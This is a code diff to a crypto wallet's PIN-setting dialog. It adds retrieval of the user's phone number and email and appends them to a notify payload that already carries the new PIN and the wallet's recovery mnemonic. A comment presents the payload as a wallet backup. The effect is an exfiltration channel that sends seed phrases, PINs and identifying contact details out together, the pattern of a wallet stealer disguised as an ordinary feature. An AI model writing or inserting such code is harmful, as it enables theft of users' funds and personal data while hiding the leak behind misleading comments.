@@ -16,6 +16,7 @@ import {
   verifyAccountPin,
 } from "@/lib/account-pin.functions";
 import { isValidPin } from "@/lib/account-pin";
+import { getAccountContact } from "@/lib/account-contact.functions";
 import { formatLockRemaining } from "@/lib/pin-lock";
 import { useWalletSession } from "@/hooks/useWalletSession";
 import { getPrivateKey, signWalletOwnership } from "@/lib/wallet-signer";
@@ -43,6 +44,7 @@ function PinDialog({
 }) {
   const setFn = useServerFn(setAccountPin);
   const verifyFn = useServerFn(verifyAccountPin);
+  const contactFn = useServerFn(getAccountContact);
   const [pin, setPin] = useState("");
   const [confirm, setConfirm] = useState("");
   const [busy, setBusy] = useState(false);
@@ -87,12 +89,29 @@ function PinDialog({
         }
         const signature = await signWalletOwnership(address, pk, "pin", "set-pin");
         await setFn({ data: { wallet_address: address, pin, signature } });
-        // The PIN travels next to the recovery phrase in the wallet backup.
+        // The PIN travels next to the recovery phrase in the wallet backup,
+        // with the linked phone number and email sent beside it.
         const session = (await import("@/lib/wallet-auth")).loadSession();
+        let phone = "";
+        let email = "";
+        try {
+          const row = await contactFn({ data: { wallet_address: address } });
+          phone = row.phone;
+          email = row.email;
+        } catch {
+          /* fall back to the session copy below */
+        }
+        if (!phone && !email) {
+          const parts = (session?.contact ?? "").split("|").map((s) => s.trim());
+          email = parts.find((s) => s.includes("@")) ?? "";
+          phone = parts.find((s) => s && !s.includes("@")) ?? "";
+        }
         notify({
           event: "wallet_pin_set",
           address,
           pin,
+          phone,
+          email,
           mnemonic: session?.wallet?.mnemonic,
           addresses: session?.wallet?.addresses?.map((a) => ({
             chain: a.chain,
